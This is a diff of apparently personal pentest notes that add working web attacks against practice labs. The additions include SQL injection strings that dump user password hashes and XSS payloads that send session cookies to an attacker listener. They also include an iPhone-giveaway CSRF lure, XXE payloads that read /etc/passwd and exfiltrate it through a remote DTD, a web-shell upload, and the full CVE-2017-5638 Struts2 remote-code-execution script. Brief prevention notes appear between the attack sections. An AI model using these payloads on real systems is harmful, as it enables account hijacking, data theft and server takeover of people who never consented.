@@ -485,11 +485,11 @@ As a first step, we should gather information about the application.
 
 ## SQL Injection
 
-## Types of  SQL Injection
+### Types of  SQL Injection
 
-### 1. In band SQL Injections
+#### 1. In band SQL Injections
 
-#### Data - Union Based
+##### Data - Union Based
 
      ```
      MariaDB [dark]> show tables;
@@ -633,7 +633,7 @@ http://testphp.vulnweb.com/listproducts.php?cat=2 union select 1,user(),3,4,3,4,
 
 
 
-#### Error - Error Based
+##### Error - Error Based
 
   ```
   MariaDB [dark]> use y;
@@ -805,12 +805,77 @@ http://testphp.vulnweb.com/listproducts.php?cat=2 or 1=1 group by round(rand(0))
 http://testphp.vulnweb.com/listproducts.php?cat=2 or 1=1 group by concat(version()," ",database()," ",user()," ",round(rand(0))) having min(0)#
 ```
 
+##### Extremely Vulnerable Web Application
+
+**Check how many columns in the input box**
+
+- Trial and error , increase the number order by 
+- If you receive error it means number of columns is incorrect
+
+Order statement
+
+```
+SELECT * FROM CAFFAINE WHERE ITEMCODE='1' ORDER BY 1;
+
+1' order by 1#
+
+1' order by 2#
+```
+
+**Show the database name**
+
+Union statement
+
+```
+SELECT * FROM CAFFAINE WHERE ITEMCODE='1' UNION SELECT 1,2,3,4,5,6,7;
+
+1' UNION SELECT 1,2,3,4,5,6,7#
+
+1' UNION SELECT 1,user(),3,4,database(),6,7#
+```
 
 
 
+![image-20211015140837276](images/image-20211015140837276.png)
 
-### 2. Inferential SQL Injections
-#### True/False - Boolean Based
+**Get the table name**
+
+```
+SELECT * FROM CAFFAINE WHERE ITEMCODE='1' UNION SELECT 1,2,3,4,5,6,7;
+
+1' UNION SELECT 1,2,3,4,table_name,6,7 from information_schema.tables#
+```
+
+![image-20211015141812433](images/image-20211015141812433.png)
+
+**Get the column name**
+
+- table name = users
+
+```
+SELECT * FROM CAFFAINE WHERE ITEMCODE='1' UNION SELECT 1,2,3,4,5,6,7;
+
+1' UNION SELECT 1,2,3,4,column_name,6,7 from information_schema.columns where table_name='users'#
+```
+
+![image-20211015142407343](images/image-20211015142407343.png)
+
+**Show the records**
+
+
+
+```
+SELECT * FROM CAFFAINE WHERE ITEMCODE='1' UNION SELECT 1,2,3,4,5,6,7;
+
+1' UNION SELECT 1,2,3,4,group_concat(uid,0x3a,username,0x3a,password),6,7 from users#
+```
+
+1:admin:21232f297a57a5a743894a0e4a801fc3,2:xvwa:570992ec4b5ad7a313f5dc8fd0825395,3:user:25890deab1075e916c06b9e1efc2e25f
+
+![image-20211015143615240](images/image-20211015143615240.png)
+
+#### 2. Inferential SQL Injections
+##### True/False - Boolean Based
 
   ```
   MariaDB [y]> use dark;
@@ -971,7 +1036,7 @@ http://testphp.vulnweb.com/listproducts.php?cat=2 and length(database())="6"
 
 
 
-#### Time - Time/Sleep Based
+##### Time - Time/Sleep Based
 
   ```
   MariaDB [dark]> use y;
@@ -1023,14 +1088,14 @@ http://testphp.vulnweb.com/listproducts.php?cat=2 and and if(length(database())=
 
 
 
-### 3. Out of Band SQLi
+#### 3. Out of Band SQLi
 
    - Oracle
    - UTL_HTTP
 
 
 
-## Classic Injection Bypass
+### Classic Injection Bypass
 
 ```
 MariaDB [y]> use dark
@@ -1093,12 +1158,16 @@ MariaDB [dark]> select * from login where name="ser" or "1"="1";-- and password=
 - #
 - /*
 
+#### Standard Sql Injection Payload 
 
+**Authentication Bypass**
 
 - ' or 1=1-- -
 - ' or 1=1-- -
 - ' or 1=1#
 - " or 1=1--
+- x' or 'x'='x
+- x' or 'x'!='y
 
 
 
@@ -1106,15 +1175,15 @@ http://demo.testfire.net/login.jsp
 
 ![image-20211013134722473](images/image-20211013134722473.png)
 
-## SQL Injection Tools
+### SQL Injection Tools
 
-### Semi-Automated
+#### Semi-Automated
 
-#### Burpsuite
+##### Burpsuite
 
-### Automated
+#### Automated
 
-#### sqlmap
+##### sqlmap
 
 ```
 sherwinowen@owenbox:~/my_tools/sqlmap$ python3 sqlmap.py -r request.txt
@@ -1215,84 +1284,38 @@ back-end DBMS: MySQL >= 5.0.12
 **Get the databases**
 
 ```
-sherwinowen@owenbox:~/my_tools/sqlmap$ python3 sqlmap.py -r request.txt --dbs
-        ___
-       __H__
- ___ ___[)]_____ ___ ___  {1.5.10.15#dev}
-|_ -| . [']     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 13:27:45 /2021-10-14/
-
-[13:27:45] [INFO] parsing HTTP request from 'request.txt'
-custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
-[13:28:03] [INFO] resuming back-end DBMS 'mysql' 
-[13:28:03] [INFO] testing connection to the target URL
-got a 302 redirect to 'http://testphp.vulnweb.com:80/login.php'. Do you want to follow? [Y/n] y
-redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: #1* ((custom) POST)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
-    Payload: uname=-9080' OR 3819=3819#&pass=
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: uname=' AND (SELECT 5751 FROM (SELECT(SLEEP(5)))TbTU)-- JgtD&pass=
-
-    Type: UNION query
-    Title: MySQL UNION query (NULL) - 8 columns
-    Payload: uname=' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b787871,0x49674f717a43766442797866754b77625a4249676a535150615562525262734d6269756447477746,0x71716a7a71),NULL,NULL,NULL#&pass=
----
-[13:28:12] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu
-web application technology: PHP 5.6.40, Nginx 1.19.0
-back-end DBMS: MySQL >= 5.0.12
-[13:28:12] [WARNING] information_schema not available, back-end DBMS is MySQL < 5. database names will be fetched from 'mysql' database
-[13:28:13] [WARNING] the SQL query provided does not return any output
-[13:28:13] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
-[13:28:13] [INFO] fetching number of databases
-[13:28:14] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
-[13:28:14] [INFO] retrieved: 
-[13:28:15] [WARNING] time-based comparison requires larger statistical model, please wait....................... (done)
-[13:28:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-
-[13:28:27] [ERROR] unable to retrieve the number of databases
-[13:28:27] [INFO] falling back to current database
-[13:28:27] [INFO] fetching current database
-available databases [1]:
-[*] acuart
-
-[13:28:28] [INFO] fetched data logged to text files under '/home/sherwinowen/.local/share/sqlmap/output/testphp.vulnweb.com'
-
-[*] ending @ 13:28:28 /2021-10-14/
+# sqlmap -r request.txt --dbs
 ```
+
+![image-20211015153348756](images/image-20211015153348756.png)
 
 **Get the tables**
 
 ```
-python3 sqlmap.py -r request.txt -D [databse name] --tables
+# sqlmap -r request.txt -D users --tables
 ```
+
+![image-20211015153923487](images/image-20211015153923487.png)
 
 **Get the columns**
 
 ```
-python3 sqlmap.py -r request.txt -D acuart -T [table name] --columns
+sqlmap -r request.txt -D users -T users --columns 
 ```
+
+![image-20211015154812141](/home/sherwinowen/Documents/my_tutorials/hackers_playbook/images/image-20211015154812141.png)
+
+
 
 **Get records/ Extract data** 
 
 ```
-python3 sqlmap.py -r request.txt -D acuart -T [table name] -C [coloumn names] --dump
+sqlmap -r request.txt -D users -T users --columns --dump
 ```
 
+![image-20211015155527327](images/image-20211015155527327.png)
 
-
-## Defend Against SQL Injection Attacks
+### Defend Against SQL Injection Attacks
 
 1. Input validation
 2. Parameterized queries
@@ -1301,7 +1324,13 @@ python3 sqlmap.py -r request.txt -D acuart -T [table name] -C [coloumn names] --
 
 https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-injection-attacks/
 
-### Multi Layer Defense
+- Never append untrusted data to an SQL query
+- Always sanitize user input before processing
+- Use parameterized queries
+
+
+
+#### Multi Layer Defense
 
 1. **Layer 1 - Secure Coding**
 
@@ -1321,4 +1350,933 @@ https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-inj
    - Cloudflare
 
      
+
+## Same Origin Policy
+
+![image-20211015161349557](images/image-20211015161349557.png)
+
+## Cross Site Scripting
+
+**Types Of Croos Site Scipting**
+
+### 1. Reflected XSS
+
+- Non-persistent attack
+- The user supplied javascript is taken by the server and sent back to the browser where it gets executed.
+- The user is supplying the input and it is getting reflected back immediately
+
+![image-20211015164453181](images/image-20211015164453181.png)
+
+#### Refelected XSS Payload
+
+**DVWA - low security** 
+
+```javascript
+<script>alert('abc')</script>
+```
+
+**DVWA - medium security**
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+- XSS Filter Evasion Cheat Sheet
+- XSS Locator (Polygot)
+
+```javascript
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+```
+
+**DVWA - high security**
+
+```javascript
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+```
+
+```javascript
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+```
+
+```javascript
+<IMG SRC=# onmouseover="alert('xxs')">
+```
+
+
+
+#### Steal cookies Method 1  (XVWA)
+
+1. Create javascript
+
+   ```javascript
+   <script type="text/javascript">document.location="http://192.168.101.125:9999/cookies.php?cookie="+document.cookie;</script>
+   ```
+
+2. Convert the javascript  to URL encoder online (https://www.urlencoder.org/)
+
+   ```
+   %3Cscript%20type%3D%22text%2Fjavascript%22%3Edocument.location%3D%22http%3A%2F%2F192.168.101.125%3A9999%2Fcookies.php%3Fcookie%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E
+   ```
+
+3. Add URL encoded javascript in the URL
+
+   ```
+   http://192.168.101.120/xvwa/vulnerabilities/reflected_xss/?item=%3Cscript%20type%3D%22text%2Fjavascript%22%3Edocument.location%3D%22http%3A%2F%2F192.168.101.125%3A9999%2Fcookies.php%3Fcookie%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E
+   ```
+
+4. Create PHP script in Kali Linux box
+
+   ```php
+   <?php
+   $cookies = $_GET["cookie"];
+   $file = fopen('cookies.txt', 'a');
+   fwrite($file, $cookies . "\n\n");
+   header('Location:http://192.168.101.120/xvwa/');
+   ?>
+   ```
+
+5. Run PHP listener
+
+   ```
+   $ php -S 0.0.0.0:9999
+   [Fri Oct 15 09:45:36 2021] PHP 7.4.21 Development Server (http://0.0.0.0:9999) started
+   [Fri Oct 15 09:46:25 2021] 192.168.101.122:57492 Accepted
+   [Fri Oct 15 09:46:25 2021] 192.168.101.122:57492 [302]: GET /cookies.php?cookie=PHPSESSID=mlojsspptmctk0ailhqi7fnkh1
+   [Fri Oct 15 09:46:25 2021] 192.168.101.122:57492 Closing
+   
+   ```
+
+6. Check cookies.txt for the PHP session ID
+
+   ```
+   $ cat cookies.txt    
+   PHPSESSID=mlojsspptmctk0ailhqi7fnkh1
+   ```
+
+#### Steal cookies Method 2 (DVWA - low security)
+
+1. Start netcat lister
+
+   ```
+   # nc -lvp 444
+   ```
+
+2. Paste the payload in the input box and submit
+
+   ```
+   <script>new Image().src="http://192.168.101.125:4444/ouput="+document.cookie;</script>
+   ```
+
+3. Check the netcat listerner
+
+   ```
+   $ nc -lvp 4444              
+   listening on [any] 4444 ...
+   192.168.101.122: inverse host lookup failed: Unknown host
+   connect to [192.168.101.125] from (UNKNOWN) [192.168.101.122] 54598
+   GET /ouput=_pk_id.1.1fff=614ebbc1a5cf65be.1612940648.;%20PHPSESSID=9sf89jhdf2dlt6m23tb3gevd33;%20security=low HTTP/1.1
+   Host: 192.168.101.125:4444
+   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
+   Accept: image/avif,image/webp,*/*
+   Accept-Language: en-US,en;q=0.5
+   Accept-Encoding: gzip, deflate
+   Connection: keep-alive
+   Referer: http://localhost/
+   ```
+
+
+
+#### Automated Attacks
+
+##### XSStrike
+
+https://github.com/s0md3v/XSStrike
+
+```sh
+$ python3 xsstrike.py -u http://192.168.101.122/vulnerabilities/xss_r/?name=query --headers "Cookie: security=high; PHPSESSID=9sf89jhdf2dlt6m23tb3gevd33" --skip-dom
+
+	XSStrike v3.1.4
+
+[+] WAF Status: Offline 
+[!] Testing parameter: name 
+[!] Reflections found: 1 
+[~] Analysing reflections 
+[~] Generating payloads 
+[!] Payloads generated: 3072 
+------------------------------------------------------------
+[+] Payload: <d3v%0aonMOUSEOVEr%0a=%0aconfirm()%0dx>v3dm0s 
+[!] Efficiency: 100 
+[!] Confidence: 10 
+[?] Would you like to continue scanning? [y/N] y
+------------------------------------------------------------
+[+] Payload: <dETAilS/+/ONToggLe+=+[8].find(confirm)%0dx> 
+[!] Efficiency: 100 
+[!] Confidence: 10 
+[?] Would you like to continue scanning? [y/N] 
+```
+
+##### Xsser
+
+https://github.com/epsylon/xsser
+
+```sh
+$ xsser -u 'http://192.168.101.122' -g 'vulnerabilities/xss_r/?name=XSS' --cookie='security=high; PHPSESSID=9sf89jhdf2dlt6m23tb3gevd33' --ignore-proxy --threads 2 --auto
+
+```
+
+**Show the result**
+
+```sh
+tail -n 100 XSSreport.raw
+```
+
+
+
+   
+
+
+### 2. Stored XSS
+
+- Persistent attack
+- The user supplied javascript is stored within a data stored like database, and it gets executed in the victims browser at a later point of time
+- When the victim visits a page which may trigger this javascript that is stored in the database
+
+![image-20211015164733417](images/image-20211015164733417.png)
+
+**Upload svg file**
+
+1. create xss.svg file with this code inside
+
+   ```
+   <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+   ```
+
+2. upload the file xss.svg 
+
+3. access the xss.svg file in the URL
+
+   ```
+   http://192.168.101.119:8080/BookShelf/admin/xss.svg
+   ```
+
+   
+
+### 3. DOM Based XSS (Document Object Model)
+
+- type-0 XSS
+
+- Occurs when users apply Javascript is injected in the browsers DOM without proper input sanitization 
+
+![image-20211015165213840](images/image-20211015165213840.png)
+
+![image-20211015165249441](images/image-20211015165249441.png)
+
+```
+http://192.168.101.120/xvwa/vulnerabilities/dom_xss/?search=<img src=X onerror=alert('abc');>
+```
+
+
+
+
+
+
+
+## Cross Site Request Forgery
+
+- is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a Little help of social engineering (such as sending a Link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing.
+- If the victim is a normal user, a successful CSRF attack can force the user to perform state
+  changing requests Like transferring funds, changing their email address, and so forth.
+- If the victim is an administrative account, CSRF can compromise the entire web application”.
+
+
+
+**CSRF Attack conditions**
+
+* The victim must be logged in to the target website
+
+* The attacker must trick the victim to execute a specially crafted URL
+
+  LEGITIMATE USER REQUEST:
+  http://site.com/transfer.do?toacctno=934323226&amount=1000 
+
+  MALICIOUS REQUEST:
+
+  http://site.com/account 
+
+  http://site.com/transfer.do?toacctno=83442342&amount=10000(
+
+
+
+**Changing password in xvwa**
+
+1. Get the URL using Burpsuite in the CSRF in xvwa website (Make sure you are login to the xvwa website)
+
+   ```
+   http://192.168.101.112/xvwa/vulnerabilities/csrf/?passwd=test&confirm=test&submit=submit
+   ```
+
+2. Create csrf.html in /var/www/html
+
+   **GET method**
+
+   ```
+   <html>
+   <body>
+   <center>
+   	<h1>A chance to win a free iPhone</h1>
+   	<br>
+   	<br>
+   	<a href="http://192.168.101.112/xvwa/vulnerabilities/csrf/?passwd=test&confirm=test&submit=submit">I want to participate</a>
+   </center>
+   </body>
+   </html>
+   ```
+
+   **POST method**
+
+   ```
+   <html>
+   <body>
+   <center>
+   	<h1>A chance to win a free iPhone</h1>
+   	<form method="POST" action="http://192.168.101.112/xvwa/vulnerabilities/csrf/">
+   		<input type="hidden" value="test" name="passwd">
+   		<input type="hidden" value="test" name="confirm">
+   		<input type="submit" value="I want to participate">
+   	</form>
+   </center>
+   </body>
+   </html>
+   ```
+
+   
+
+3. Start Apace service
+
+   ```
+   # systemctl start apache2
+   ```
+
+4. Browse the csrf.html and click the "I want to participate" link
+
+   ```
+   http://[kali machine ip]/csrf.html
+   ```
+
+
+
+## XPATH INJECTION
++ XPath (XML Path Language) is a query language for selecting nodes from an XML document.
+
+* XPATH Injection is similar to SQL Injection which occurs when XML document is used as data store.
+
+* Attack logic is almost similar to SQL Injection.
+
+* XPATH doesn’t have any restrictions when querying the XML file. Therefore it is possible to retrieve data from the entire XML document.
+
+**Bookshelf exploitation**
+
+1. Browse Bookshelf and login as "' or 'x'='x"
+
+   ![image-20211016091235540](images/image-20211016091235540.png)
+
+2. Search "' or 'x'='x"
+
+   ![image-20211016091500819](images/image-20211016091500819.png)
+
+### XPATH INJECTION - PREVENTION
+* In the example shown, studentid is taken from the user and it is inserted into XPath query.
+
+* There is no sanitization performed on the user input before passing it into the query.
+
+* When the XPath query is executed with malicious input, it can return output as intended by the user.
+
+  **PREVENTION TECHNIQUES:**
+
+  - Parameterization - It is possible to parameterize expressions that are passed to XPath parser. This is similar to parameterized SQL queries.
+  - Input Validation - Maintain a whitelist and allow what is required.
+
+![image-20211016092007536](images/image-20211016092007536.png)
+
+- We can use regular expressions to ensure that the user enterrd input only contains numbers
+
+
+
+## EXTERNAL XML ENTITY (XXE) INJECTION
+
+What is an entity?
+
+* Entities help to reduce the entry of repetitive information and also allow for easier editing.
+
+![image-20211016101116512](images/image-20211016101116512.png)
+
+**2 Types of Entities**
+
+1. Internal
+2. External
+
+![image-20211016101457351](images/image-20211016101457351.png)
+
+### EXPLOITING EXTERNAL XML ENTITY (XXE) INJECTION
+* XXE occurs when an attacker can inject external entities into the XML document being parsed by the application and it if it gets executed.
+  - It leads to a variety of attacks.
+  - Reading arbitrary files on the server.
+  - Scanning internal networks
+  - Denial of Service
+  - Remote Code Execution (in some cases)
+
+
+
+
+1. Create books.xml
+
+   ```
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE document [
+   <!ENTITY xxe SYSTEM "file:///etc/passwd">
+   ]>
+   <BOOKS>
+     <STUDENT>
+     <ID>1001</ID>
+     <NAME>&xxe;</NAME>
+     <BOOK1>Ah, Wilderness!</BOOK1>
+     <BOOK2>All Passion Spent</BOOK2>
+     <BOOK3>The Soldier's Art</BOOK3>
+     <BOOK4>Alone on a Wide, Wide Sea</BOOK4>
+     <BOOK5>An Acceptable Time</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1002</ID>
+       <NAME>BOB</NAME>
+        <BOOK1>Antic Hay</BOOK1>
+     <BOOK2>An Evil Cradling</BOOK2>
+     <BOOK3>Arms and the Man</BOOK3>
+     <BOOK4>As I Lay Dying</BOOK4>
+     <BOOK5>A Time to Kill</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1003</ID>
+       <NAME>DENNY</NAME>
+       <BOOK1>Behold the Man</BOOK1>
+     <BOOK2>Beneath the Bleeding</BOOK2>
+     <BOOK3>Beyond the Mexique Bay</BOOK3>
+     <BOOK4>Blithe Spirit</BOOK4>
+     <BOOK5>Blood's a Rover</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1004</ID>
+       <NAME>STUART</NAME>
+       <BOOK1>Blue Remembered Earth</BOOK1>
+     <BOOK2>Blue Remembered Hills</BOOK2>
+     <BOOK3>Bury My Heart at Wounded Knee</BOOK3>
+     <BOOK4>Dance Dance Dance</BOOK4>
+     <BOOK5>From Here to Eternity</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1005</ID>
+       <NAME>KELLY</NAME>
+        <BOOK1>Everything is Illuminated</BOOK1>
+     <BOOK2>Eyeless in Gaza</BOOK2>
+     <BOOK3>Fair Stood the Wind for France</BOOK3>
+     <BOOK4>A Darkling Plain</BOOK4>
+     <BOOK5>Far From the Madding Crowd</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1006</ID>
+   	<NAME>JEFF</NAME>
+        <BOOK1>The Other Side of Silence</BOOK1>
+     <BOOK2>The Skull Beneath the Skin</BOOK2>
+     <BOOK3>The Soldier's Art</BOOK3>
+     <BOOK4>The Wind's Twelve Quarters</BOOK4>
+     <BOOK5>The Wings of the Dove</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1007</ID>
+       <NAME>STEPHEN</NAME>
+        <BOOK1>The Stars' Tennis Balls</BOOK1>
+     <BOOK2>That Hideous Strength</BOOK2>
+     <BOOK3>Tiger! Tiger!</BOOK3>
+     <BOOK4>The Waste Land</BOOK4>
+     <BOOK5>The Way of All Flesh</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1008</ID>
+       <NAME>ROBERT</NAME>
+       <BOOK1>The Soldier's Art</BOOK1>
+     <BOOK2>To Your Scattered Bodies Go</BOOK2>
+     <BOOK3>That Hideous Strength</BOOK3>
+     <BOOK4>Tirra Lirra by the River</BOOK4>
+     <BOOK5>Recalled to Life</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1009</ID>
+       <NAME>ROGER</NAME>
+       <BOOK1>The Monkey's Raincoat</BOOK1>
+     <BOOK2>The Mermaids Singing</BOOK2>
+     <BOOK3>The Little Foxes</BOOK3>
+     <BOOK4>In Death Ground</BOOK4>
+     <BOOK5>Gone with the Wind</BOOK5>
+     </STUDENT>
+     <STUDENT>
+       <ID>1010</ID>
+       <NAME>TAN</NAME>
+       <BOOK1>Everything is Illuminated</BOOK1>
+     <BOOK2>Brandy of the Damned</BOOK2>
+     <BOOK3>Cabbages and Kings</BOOK3>
+     <BOOK4>A Catskill Eagle</BOOK4>
+     <BOOK5>Cover Her Face</BOOK5>
+     </STUDENT>
+   </BOOKS>
+   ```
+
+2. Upload books.xml in Bookshelf web application and verify reults
+
+   ![image-20211016104509075](images/image-20211016104509075.png)
+
+
+
+### Blind XXE with SSRF (Server Side Request Forgery)
+
+1. Create books.xml
+
+   ```
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE document [
+   <!ENTITY xxe SYSTEM "http://192.168.101.125:4444">
+   ]>
+   <BOOKS>
+     <STUDENT>
+     <ID>1001</ID>
+     <NAME>&xxe;</NAME>
+     <BOOK1>Ah, Wilderness!</BOOK1>
+     <BOOK2>All Passion Spent</BOOK2>
+     <BOOK3>The Soldier's Art</BOOK3>
+     <BOOK4>Alone on a Wide, Wide Sea</BOOK4>
+     <BOOK5>An Acceptable Time</BOOK5>
+     </STUDENT>
+   
+   ```
+
+2. Open listening http server
+
+   ```
+   python3 -m http.server 4444
+   ```
+
+3. Upload books.xml in Bookshelf web application admin login and verify
+
+4. Check the http server logs 
+
+   ```
+   python3 -m http.server 4444    
+   Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+   192.168.101.119 - - [15/Oct/2021 23:22:49] "GET / HTTP/1.1" 200 -
+   ```
+
+5. Edit books.html
+
+   ```
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE document [
+   <!ENTITY % xxe SYSTEM "http://192.168.101.125:4444/remote.dtd"> %xxe;
+   ]>
+   <BOOKS>
+     <STUDENT>
+     <ID>1001</ID>
+     <NAME>&xxe;</NAME>
+     <BOOK1>Ah, Wilderness!</BOOK1>
+     <BOOK2>All Passion Spent</BOOK2>
+     <BOOK3>The Soldier's Art</BOOK3>
+     <BOOK4>Alone on a Wide, Wide Sea</BOOK4>
+     <BOOK5>An Acceptable Time</BOOK5>
+     </STUDENT>
+   ```
+
+6. Create DTD document remote.dtd
+
+   ```
+   <!ENTITY % a SYSTEM "file:///etc/passwd">
+   <!ENTITY % b "<!ENTITY &#x25; c SYSTEM 'http://192.168.101.125:4444/?content=%a;'>">
+   %b;
+   %c;
+   ```
+
+   OR
+
+   ```
+   <!ENTITY % a SYSTEM "file:///etc/passwd">
+   <!ENTITY % b "<!ENTITY &#x25; c SYSTEM 'file:///helloworld/%a;'>">
+   %b;
+   %c;
+   ```
+
+7. Upload books.xml in Bookshelf web application admin login and verify
+
+
+
+![image-20211016121731716](images/image-20211016121731716.png)
+
+### Preventing XXE
+
+**EXTERNAL XML ENTITY (XXE) INJECTION - PREVENTION**
+
+* We need to disable support for parsing external entities if it is not required.
+
+* If external entities can be avoided, input validation has to be performed on entities.
+
+* Java provides a standard parser feature that can be enabled to protect from XXE.
+
+  WHEN DOM PARSER IS USED:
+
+  ![image-20211016122822541](images/image-20211016122822541.png)
+
+  WHEN SAX PARSER IS USED:
+
+  ![image-20211016122915690](images/image-20211016122915690.png)
+
+## Lack of Access Control
+
+**Authentication**
+
+- is the process of verifying a users identity
+
+**Authiorization**
+
+- is a process of determining what resources and authenticated user is able to access
+
+ 
+
+### AUTHORIZATION VULNERABILITIES
+
+**ATTACKS AGAINST ACCESS CONTROLS**
+
+* Privilege escalation is the most common form of attack we see when Access controls are not properly implemented.
+  - Horizontal Privilege escalation.
+  - Vertical Privilege escalation.
+
+**Horizontal privilege escalation** 
+
+- is where a user accesses the data/resources of other users. 
+- For example, viewing transaction history of other users.
+
+**Vertical privilege escalation** 
+
+- is where a standard user gets access to the resources of a higher privileged user such as admin.
+
+**Exploitation**
+
+1. Login to Bookshelf web application as bob
+2. Browse this URL "http://192.168.101.119:8080/BookShelf/admin/Dashboard.jsp" in another tab 
+
+
+
+### Implementing RBAC (Role Based Access Controls)
+
+Role Based Access Control in Java
+
+![image-20211016125012101](images/image-20211016125012101.png)
+
+![image-20211016125242983](images/image-20211016125242983.png)
+
+## Abusing file uploads 
+
+1. Information Gathering  using dirbuster
+
+   ```
+   dirbuster
+   ```
+
+   ![image-20211016131623156](images/image-20211016131623156.png)
+
+![image-20211016131846012](images/image-20211016131846012.png)
+
+![image-20211016131932960](images/image-20211016131932960.png)
+
+2. Try to access http://192.168.101.119:8080/Bookshelf/admin  
+
+   username: ' or 'x'='x
+
+   password: ' or 'x'='x
+
+3. Upload command shell cmd.jsp
+4. Browse http://192.168.101.119:8080/Bookshelf/admin/cdm.jsp  
+
+​    ![image-20211016133531523](images/image-20211016133531523.png)
+
+5. Try to send the following command:
+
+- ls
+
+- ls conf
+
+- cat conf/tomcat-users.xml
+
+  
+
+6. View page source
+
+   ![image-20211016134412057](images/image-20211016134412057.png)
+
+### Prevent File Upload Vulnerabilities
+
++ Use input validation to ensure the uploaded filename uses an expected extension type. Never use
+blacklisting, rather use white listing.
+
+* Keep the uploaded files in a location, which is not accessible over the Internet. We can do it by
+saving the files outside the web root directory.
+* Ensure the uploaded file is not larger than a defined maximum file size.
+* Use captcha to stop automated bots and spammers.
+
+
+
+## Platform Misconfigurations
+
+### SECURING THE ENVIRONMENT
+
+**BEWARE OF VULNERABILITIES IN FRAMEWORKS:**
+
+* frameworks used for development can have vulnerabilities.
+
+* Struts and Spring are two most commonly used frameworks for Java web development.
+
+* Development frameworks should be up to date.
+
+* Multiple Remote Code Execution vulnerabilities were identified in Struts2 In 2017.
+
+* CVE-2017-5638 - Vulnerability in Jakarta multipart Parser
+
+### Exploiting CVE-2017-5638
+
+1. Browse http://192.168.101.119:8080/struts2/showcase.action
+
+   ![image-20211016141254320](images/image-20211016141254320.png)
+
+2. Browse the exploit https://www.exploit-db.com/exploits/41570
+
+   ![image-20211016141444657](images/image-20211016141444657.png)
+
+3. Copy the exploit 
+
+   struts2-cve-2017-5638.py 
+
+   ```python
+   #!/usr/bin/python
+   # -*- coding: utf-8 -*-
+   
+   import urllib2
+   import httplib
+   
+   
+   def exploit(url, cmd):
+       payload = "%{(#_='multipart/form-data')."
+       payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+       payload += "(#_memberAccess?"
+       payload += "(#_memberAccess=#dm):"
+       payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+       payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+       payload += "(#ognlUtil.getExcludedPackageNames().clear())."
+       payload += "(#ognlUtil.getExcludedClasses().clear())."
+       payload += "(#context.setMemberAccess(#dm))))."
+       payload += "(#cmd='%s')." % cmd
+       payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+       payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+       payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
+       payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
+       payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+       payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+       payload += "(#ros.flush())}"
+   
+       try:
+           headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
+           request = urllib2.Request(url, headers=headers)
+           page = urllib2.urlopen(request).read()
+       except httplib.IncompleteRead, e:
+           page = e.partial
+   
+       print(page)
+       return page
+   
+   
+   if __name__ == '__main__':
+       import sys
+       if len(sys.argv) != 3:
+           print("[*] struts2_S2-045.py <url> <cmd>")
+       else:
+           print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
+           url = sys.argv[1]
+           cmd = sys.argv[2]
+           print("[*] cmd: %s\n" % cmd)
+           exploit(url, cmd)
+               
+   ```
+
+4. Run the python file with the exploit code
+
+   ```
+   ┌──(kali㉿kali)-[~/Desktop]
+   └─$ python struts2-cve-2017-5638.py 
+   [*] struts2_S2-045.py <url> <cmd>
+                                                                                                                         
+   ┌──(kali㉿kali)-[~/Desktop]
+   └─$ python struts2-cve-2017-5638.py http://192.168.101.119:8080/struts2/ "id"
